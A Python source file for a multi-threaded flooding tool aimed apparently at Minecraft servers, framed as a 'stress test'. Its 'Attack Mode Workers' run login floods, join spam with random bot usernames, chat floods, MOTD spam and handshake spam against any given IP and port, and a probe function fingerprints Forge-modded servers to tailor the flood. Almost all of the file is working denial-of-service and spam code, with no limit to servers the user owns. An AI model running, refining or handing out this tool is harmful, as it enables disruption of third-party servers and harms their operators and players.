import socket
import struct
import random
import string
import threading
import time
import json
from collections import defaultdict

# --- Statistics and Reporting ---

class StressStats:
    """A thread-safe class to hold statistics for a stress test run."""
    def __init__(self):
        self.lock = threading.Lock()
        self.counters = defaultdict(int)
        self.start_time = time.time()

    def increment(self, key, value=1):
        with self.lock:
            self.counters[key] += value

    def get_stats(self):
        with self.lock:
            stats_copy = self.counters.copy()
        return stats_copy

def reporter_thread(stats, log_callback, stop_time, mode):
    """Periodically reports stats using the provided callback."""
    if not log_callback:
        return
        
    last_reported_stats = stats.get_stats()
    
    while time.time() < stop_time:
        time.sleep(2)
        if time.time() >= stop_time:
            break

        current_stats = stats.get_stats()
        
        summary_parts = []
        
        # Calculate interval rates
        interval_packets = current_stats.get('packets_sent', 0) - last_reported_stats.get('packets_sent', 0)
        interval_joins = current_stats.get('joins_succeeded', 0) - last_reported_stats.get('joins_succeeded', 0)
        interval_messages = current_stats.get('messages_sent', 0) - last_reported_stats.get('messages_sent', 0)
        
        rate_packets = round(interval_packets / 2, 1)
        rate_joins = round(interval_joins / 2, 1)
        rate_messages = round(interval_messages / 2, 1)

        if 'spam' in mode:
             summary_parts.append(f"Packets Sent: {current_stats.get('packets_sent', 0)} (~{rate_packets}/s)")
        elif 'flood' in mode or 'join' in mode:
             summary_parts.append(f"Joins: {current_stats.get('joins_succeeded', 0)} (~{rate_joins}/s)")
             summary_parts.append(f"Fails: {current_stats.get('joins_failed', 0)}")
             if 'chat' in mode:
                 summary_parts.append(f"Messages: {current_stats.get('messages_sent', 0)} (~{rate_messages}/s)")

        if summary_parts:
            log_callback({
                "level": "INFO",
                "message": f"Progress: {', '.join(summary_parts)}"
            })
        
        last_reported_stats = current_stats

# --- Packet Utilities ---

def pack_varint(value):
    """Packs an integer into a VarInt."""
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out += struct.pack("B", byte)
        if value == 0:
            break
    return out

def pack_string(value):
    """Packs a string with its VarInt length."""
    return pack_varint(len(value)) + value.encode('utf-8')

def pack_packet(packet_id, data):
    """Packs a packet with its ID and data."""
    data = pack_varint(packet_id) + data
    return pack_varint(len(data)) + data

def read_varint(sock):
    """Reads a VarInt from a socket."""
    number = 0
    shift = 0
    while True:
        byte = sock.recv(1)
        if not byte:
            raise ConnectionError("Socket closed while reading VarInt")
        byte = ord(byte)
        number |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            break
        shift += 7
    return number

def read_string(sock):
    """Reads a string from a socket."""
    length = read_varint(sock)
    return sock.recv(length).decode('utf-8')

# --- Core Connection Logic (Instrumented) ---

def send_fake_join(ip, port, username, mod_data=None, stats=None):
    """Establishes a connection and performs a fake login."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        if mod_data and 'FML' in mod_data.get('type', ''):
            ip_fml = f"{ip}\0FML\0"
            handshake_data = pack_varint(-1) + pack_string(ip_fml) + struct.pack(">H", port) + pack_varint(2)
        else:
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(2)
        sock.sendall(pack_packet(0x00, handshake_data))

        login_data = pack_string(username)
        sock.sendall(pack_packet(0x00, login_data))
        if stats: stats.increment('packets_sent', 2)

        sock.settimeout(0.5)
        sock.recv(1024)
        if stats: stats.increment('joins_succeeded')
        return sock
    except Exception:
        if stats: stats.increment('joins_failed')
        if 'sock' in locals():
            sock.close()
        return None

def send_login_attempt(ip, port, username, stats=None):
    """Sends a handshake and login start packet without waiting for a response."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((ip, port))
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(2)
            sock.sendall(pack_packet(0x00, handshake_data))
            login_data = pack_string(username)
            sock.sendall(pack_packet(0x00, login_data))
            if stats: stats.increment('packets_sent', 2)
    except Exception:
        if stats: stats.increment('errors')

def send_chat_message(sock, message, stats=None):
    """Sends a chat message on an established socket."""
    try:
        chat_data = pack_string(message)
        sock.sendall(pack_packet(0x03, chat_data))
        if stats:
            stats.increment('packets_sent')
            stats.increment('messages_sent')
        return True
    except Exception:
        if stats: stats.increment('errors')
        return False

def send_motd_request(ip, port, stats=None):
    """Performs a server list ping (MOTD request)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((ip, port))
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
            sock.sendall(pack_packet(0x00, handshake_data))
            sock.sendall(pack_packet(0x00, b''))
            if stats: stats.increment('packets_sent', 2)
            sock.recv(4096)
    except Exception:
        if stats: stats.increment('errors')

# --- Attack Mode Workers ---

def worker_login_flood(stop_time, ip, port, mod_data, stats):
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username, mod_data, stats)
        if sock:
            time.sleep(0.5)
            sock.close()

def worker_join_spam(stop_time, ip, port, stats):
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username, stats=stats)
        if sock:
            time.sleep(random.uniform(1, 4))
            sock.close()
        time.sleep(random.uniform(0.1, 0.5))

def worker_chat_flood(stop_time, ip, port, stats):
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    sock = send_fake_join(ip, port, username, stats=stats)
    if not sock:
        return
    while time.time() < stop_time:
        message = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(10, 50)))
        if not send_chat_message(sock, message, stats=stats):
            break
        time.sleep(random.uniform(0.5, 2))
    sock.close()

def worker_motd_spam(stop_time, ip, port, stats):
    while time.time() < stop_time:
        send_motd_request(ip, port, stats=stats)
        time.sleep(random.uniform(0.05, 0.2))

def worker_handshake_spam(stop_time, ip, port, stats):
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        send_login_attempt(ip, port, username, stats=stats)
        time.sleep(0.02)

# --- Main Orchestrator ---

def run_stress(ip, port, threads=100, duration=30, mode="login_flood", mod_data=None, log_callback=None):
    stop_time = time.time() + duration
    stats = StressStats()
    
    worker_map = {
        "login_flood": (worker_login_flood, (stop_time, ip, port, None, stats)),
        "modded_flood": (worker_login_flood, (stop_time, ip, port, mod_data, stats)),
        "join_spam": (worker_join_spam, (stop_time, ip, port, stats)),
        "chat_flood": (worker_chat_flood, (stop_time, ip, port, stats)),
        "motd_spam": (worker_motd_spam, (stop_time, ip, port, stats)),
        "handshake_spam": (worker_handshake_spam, (stop_time, ip, port, stats)),
    }

    target_worker, args = worker_map.get(mode, (worker_login_flood, (stop_time, ip, port, None, stats)))
    
    if log_callback:
        log_callback({"level": "SYSTEM", "message": f"Starting task: {mode} on {ip}:{port} for {duration}s"})
    else:
        print(f"Starting stress test: mode={mode}, threads={threads}, duration={duration}s")
    
    worker_threads = []
    for _ in range(threads):
        thread = threading.Thread(target=target_worker, args=args, daemon=True)
        worker_threads.append(thread)
        thread.start()

    reporter = None
    if log_callback:
        reporter = threading.Thread(target=reporter_thread, args=(stats, log_callback, stop_time, mode), daemon=True)
        reporter.start()

    for thread in worker_threads:
        thread.join()

    if reporter:
        reporter.join(timeout=0.1)

    if log_callback:
        final_stats = stats.get_stats()
        elapsed = time.time() - stats.start_time
        
        summary_parts = []
        if 'packets_sent' in final_stats:
            rate = round(final_stats['packets_sent'] / elapsed, 1) if elapsed > 0 else 0
            summary_parts.append(f"Total Packets: {final_stats['packets_sent']} (Avg: {rate}/s)")
        if 'joins_succeeded' in final_stats:
            summary_parts.append(f"Total Joins: {final_stats['joins_succeeded']}")
        if 'joins_failed' in final_stats:
            summary_parts.append(f"Total Fails: {final_stats['joins_failed']}")
        if 'messages_sent' in final_stats:
            summary_parts.append(f"Total Messages: {final_stats['messages_sent']}")
        if 'errors' in final_stats:
            summary_parts.append(f"Errors: {final_stats['errors']}")

        log_callback({
            "level": "SUCCESS",
            "message": f"Task finished. Final Stats: {', '.join(summary_parts)}"
        })

def probe_server_for_mods(ip, port, timeout=5):
    """Probes a server for its modlist. Returns mod data if found."""
    print(f"[PROBE-INFO] Probing {ip}:{port} for modlist...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        sock.connect((ip, port))
        handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
        sock.sendall(pack_packet(0x00, handshake_data))
        sock.sendall(pack_packet(0x00, b''))
        packet_len = read_varint(sock)
        packet_id = read_varint(sock)
        if packet_id != 0x00:
            raise ConnectionError("Invalid status response packet ID.")
        json_response = read_string(sock)
        data = json.loads(json_response)
        if 'modinfo' in data and data['modinfo'].get('type') == 'FML':
            return data['modinfo']
        else:
            raise ValueError("Server does not appear to be a Forge/FML modded server.")
